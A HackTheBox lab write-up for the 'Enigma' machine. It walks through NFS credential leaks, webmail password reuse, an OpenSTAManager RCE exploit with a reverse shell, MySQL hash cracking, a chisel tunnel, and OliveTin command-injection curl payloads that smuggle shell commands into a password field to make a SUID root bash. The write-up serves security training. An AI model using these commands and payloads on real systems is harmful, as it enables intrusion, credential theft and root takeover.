# Enigma — HackTheBox Writeup

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**IP:** `$TARGET`  
**Domain:** `enigma.htb`, `mail001.enigma.htb`, `support_001.enigma.htb`  
**Tech Stack:** nginx, Dovecot (IMAP/POP3), NFS, OpenSTAManager 2.9.8, OliveTin, MySQL

---

## Attack Chain Overview

```
NFS onboarding share
   → PDF with kevin:Enigma2024! credentials
   → Webmail credential pivot to sarah
   → IT email leaks support portal creds
   → OpenSTAManager RCE (CVE-2026-38751) → www-data shell
   → MySQL config → bcrypt hash → hashcat → su haris
   → OliveTin password-type injection (CVE-2026-27626) → RCE as root
   → SUID bash copy → root
```

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [NFS Share Enumeration](#2-nfs-share-enumeration)
3. [Webmail Credential Pivot](#3-webmail-credential-pivot)
4. [OpenSTAManager RCE — CVE-2026-38751](#4-openstamanager-rce--cve-2026-38751)
5. [Linux Enumeration](#5-linux-enumeration)
6. [Hash Extraction and Cracking](#6-hash-extraction-and-cracking)
7. [Lateral Movement — su haris](#7-lateral-movement--su-haris)
8. [Privilege Escalation — OliveTin CVE-2026-27626](#8-privilege-escalation--olivetin-cve-2026-27626)
9. [Root Flag](#9-root-flag)
10. [Key Takeaways](#10-key-takeaways)

---

## 1. Reconnaissance

```bash
nmap -sS -p- --min-rate 5000 -n -Pn $TARGET -oN silent
nmap -sVC -p22,80,110,111,143,993,995,2049,36815,41307,42337,42629,51951 $TARGET -oN service
```

Key services identified:

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | OpenSSH 9.6p1 |
| 80 | HTTP | nginx 1.24.0 |
| 110/995 | POP3 | Dovecot |
| 143/993 | IMAP | Dovecot |
| 111/2049 | RPC/NFS | NFS share exposed |

The presence of ports 111 and 2049 immediately signals an NFS share — always check for credential files or sensitive documents when an NFS export is accessible without auth.

Related notes: [nmap](../../../tools/recon/nmap.md), [showmount](../../../tools/recon/showmount.md)

---

## 2. NFS Share Enumeration

```bash
showmount -e $TARGET
# Output: /srv/nfs/onboarding
```

The export path `/srv/nfs/onboarding` hints at employee onboarding material — exactly the kind of share that leaks first-day credentials.

```bash
mkdir /tmp/nfs_mount
sudo mount -t nfs $TARGET:/srv/nfs/onboarding /tmp/nfs_mount
ls -la /tmp/nfs_mount
```

Inside the mount: a PDF for a new employee containing plaintext credentials:

```
Employee:  Kevin Mitchell
URL:       http://mail001.enigma.htb
Username:  kevin
Password:  Enigma2024!
```

Add vhosts to `/etc/hosts`:

```bash
echo "$TARGET enigma.htb mail001.enigma.htb support_001.enigma.htb" | sudo tee -a /etc/hosts
```

Full technique: [nfs-share-abuse](../../../exploits/network-services/nfs-share-abuse.md)

---

## 3. Webmail Credential Pivot

Logged into `http://mail001.enigma.htb` as `kevin:Enigma2024!`. Kevin's inbox had an email addressed to `sarah`. Tried the same password for sarah — it worked (credential reuse between the same org).

Sarah's inbox had a message from IT Support with the support portal URL:

```
URL:      http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

**Why this mattered:** IMAP/webmail is routinely overlooked during initial enumeration. When multiple mail users share a password and you can enumerate usernames from email headers, credential spraying across all visible mailboxes is always worth trying.

---

## 4. OpenSTAManager RCE — CVE-2026-38751

The support portal at `http://support_001.enigma.htb` ran **OpenSTAManager v2.9.8**. Version confirmed at:

```
http://support_001.enigma.htb/modules/utenti/info.php
```

Exploited with a public PoC:

```bash
git clone https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751
cd OpenSTAManager-RCE-Exploit-CVE-2026-38751
cargo build --release

./openstamanager-rce-exploit \
  --url http://support_001.enigma.htb \
  -U admin -P Ne3s4rtars78s \
  --lhost 10.10.15.26 --lport 4444
```

Reverse shell received as `www-data`. Stabilized:

```bash
# Ctrl+Z
stty raw -echo; fg
# When prompted for terminal type:
export TERM=xterm SHELL=bash
```

Full technique: [openstamanager-rce-cve-2026-38751](../../../exploits/web-rce/openstamanager-rce-cve-2026-38751.md)

---

## 5. Linux Enumeration

```bash
cat /etc/passwd | grep bash
# haris:x:1000:1000:...:/home/haris:/bin/bash
```

Found the application config file with database credentials:

```bash
cat config.inc.php
# $db_username = 'brollin'
# $db_password = 'Fri3nds@9099'
# $db_name = 'openstamanager'
```

Web application config files (especially `config.inc.php`, `config.php`, `.env`, `wp-config.php`) almost always contain DB credentials. Always cat them early.

---

## 6. Hash Extraction and Cracking

Logged into MySQL with the recovered credentials and extracted `haris`'s bcrypt hash:

```bash
mysql -u brollin -p'Fri3nds@9099' -h localhost openstamanager
SELECT username, password FROM zz_users WHERE username = 'haris';
# $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

Saved and cracked with hashcat (mode 3200 = bcrypt):

```bash
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > hash_haris.txt
hashcat -m 3200 -a 0 hash_haris.txt /usr/share/wordlists/rockyou.txt --force
# Result: bestfriends
```

Related notes: [mysql](../../../tools/database/mysql.md), [hashcat](../../../tools/creds/hashcat.md)

---

## 7. Lateral Movement — su haris

SSH was restricted to key-based auth only. Switched user directly from the www-data shell:

```bash
su haris
# password: bestfriends
cat /home/haris/user.txt
```

**User flag captured.**

---

## 8. Privilege Escalation — OliveTin CVE-2026-27626

### Discovery

```bash
ls /opt/OliveTin/
ps aux | grep -i olive
# root  1520  /usr/local/bin/OliveTin
```

OliveTin was running as **root** on `127.0.0.1:1337`. The real config was at `/etc/OliveTin/config.yaml`.

### Port Forwarding with Chisel

To access the OliveTin web UI from the attacker machine:

```bash
# Attacker machine
chisel server -p 8888 --reverse

# Target machine (from haris shell)
./chisel client 10.10.15.26:8888 R:1337:127.0.0.1:1337
```

Browsed to `http://127.0.0.1:1337` on the attacker machine.

Related notes: [chisel](../../../tools/pivot/chisel.md)

### Identifying the Vulnerable Action

Using browser DevTools → Network tab, we found the `Backup Database` action config:

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_user
      type: ascii_identifier
    - name: db_pass
      type: password      # <-- NOT validated by checkShellArgumentSafety
    - name: db_name
      type: ascii_identifier
```

The argument `db_pass` has type `password`. Per **CVE-2026-27626**, OliveTin's `checkShellArgumentSafety` function does not validate arguments of type `password`, allowing shell metacharacter injection.

### API Discovery

OliveTin uses a **gRPC/Connect** protocol — not plain REST. The endpoint discovered via DevTools:

```
POST /api/olivetin.api.v1.OliveTinApiService/StartAction
```

A `uniqueTrackingId` field is also required; without it the server returns `notfound`.

### RCE Verification

The injection payload closes the single-quoted password argument (`'`), appends arbitrary commands, then comments out the rest with `#`:

```bash
curl -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction \
  -H "Content-Type: application/json" \
  -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"'"'"'; id > /tmp/rce_test #"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"ffffffff-0000-0000-0000-000000000003"}'

cat /tmp/rce_test
# uid=0(root) gid=0(root) groups=0(root)
```

The resulting executed shell command is:

```bash
mysqldump -u backup_svc -p''; id > /tmp/rce_test #' production > /opt/backups/backup.sql
```

### Root Shell via SUID Bash

Outbound connections were blocked by a firewall. Instead, copied bash with the SUID bit set so any user can spawn a root shell:

```bash
curl -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction \
  -H "Content-Type: application/json" \
  -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"'"'"'; cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash #"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"ffffffff-0000-0000-0000-000000000005"}'
```

```bash
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root ... /tmp/rootbash

/tmp/rootbash -p
# rootbash-5.2# id
# uid=1000(haris) gid=1000(haris) euid=0(root) egid=0(root)
```

Full technique: [olivetin-cmd-injection-cve-2026-27626](../../../exploits/web-rce/olivetin-cmd-injection-cve-2026-27626.md)

---

## 9. Root Flag

```bash
cat /root/root.txt
```

**Root flag captured.**

---

## 10. Key Takeaways

1. **NFS onboarding shares leak credentials.** Always enumerate ports 111/2049 and mount any export with `showmount -e`. PDFs, Word docs and README files inside are the primary targets.
2. **Credential reuse is rampant.** After you crack one account, try the same password on every other account/service visible in the environment (mailboxes, SSH, support portals).
3. **Internal services run as root.** `OliveTin`, `php -S`, and similar "convenience" daemons are frequently misconfigured to run as root. Always enumerate internal ports with `ss -tulpn` or `netstat -tulpn`.
4. **Argument type ≠ validation.** Naming a field `password` in OliveTin's config is not a security boundary — it's a trust signal that skips safety checks. Never conflate data classification with input validation.
5. **When reverse shells are blocked, SUID bash is a reliable out.** `cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash` is one of the cleanest RCE-to-root patterns when direct netcat callbacks fail.
6. **chisel + gRPC APIs.** When you need to interact with a local service, a chisel R-tunnel is the cleanest approach — paired with browser DevTools to reconstruct the correct endpoint and required fields.

---

## CVEs

| CVE | Application | Description |
|-----|-------------|-------------|
| CVE-2026-38751 | OpenSTAManager 2.9.8 | Authenticated RCE |
| CVE-2026-27626 | OliveTin | OS Command Injection via `password` argument type bypassing `checkShellArgumentSafety` |

---

## Related Notes

- [nfs-share-abuse](../../../exploits/network-services/nfs-share-abuse.md)
- [openstamanager-rce-cve-2026-38751](../../../exploits/web-rce/openstamanager-rce-cve-2026-38751.md)
- [olivetin-cmd-injection-cve-2026-27626](../../../exploits/web-rce/olivetin-cmd-injection-cve-2026-27626.md)
- [chisel](../../../tools/pivot/chisel.md)
- [mysql](../../../tools/database/mysql.md)
- [hashcat](../../../tools/creds/hashcat.md)
- [showmount](../../../tools/recon/showmount.md)
- [nmap](../../../tools/recon/nmap.md)